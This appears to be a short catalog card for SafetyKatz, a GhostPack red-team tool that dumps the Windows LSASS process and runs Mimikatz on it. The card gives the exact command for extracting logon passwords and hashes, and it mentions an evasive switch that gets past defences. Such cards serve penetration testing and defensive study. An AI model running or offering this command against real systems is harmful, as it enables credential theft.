---
trust_level: community
id: wadcom-safetykatz
namespace: wadcom:tool:safetykatz
name: "SafetyKatz"
description: "SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and Mimikatz. The following command will dump the LSASS process and run Mimikatz to extract credentials from the dumped process. Safetykatz also supports a number of mimikatz native commands such as \"sekurlsa::evasive-keys\" etc. The evasive switch in lab and production enviroments up to windows 2016 has been noted to successfully run where the non \"evasive\" switches had not"
version: "1.0.0"
capabilities:
  - credential.dump.lsass
platforms:
  - windows
techniques:
  - credential-access
execution:
  template: "safetykatz"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Command execution"
    command: "safetykatz.exe \"privilege::debug\" \"sekurlsa::evasive-logonpasswords\" \"exit\""
references:
  - label: "Reference 1"
    url: "https://github.com/GhostPack/SafetyKatz"
  - label: "Reference 2"
    url: "https://www.harmj0y.net/blog/redteaming/ghostpack/"
items:
  - Password
  - Hash
  - TGS
  - TGT
services:
  - Kerberos
  - SMB
  - RPC
---

# SafetyKatz

SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and Mimikatz. The following command will dump the LSASS process and run Mimikatz to extract credentials from the dumped process. Safetykatz also supports a number of mimikatz native commands such as "sekurlsa::evasive-keys" etc. The evasive switch in lab and production enviroments up to windows 2016 has been noted to successfully run where the non "evasive" switches had not

```
safetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit"
```

**Required:** Shell
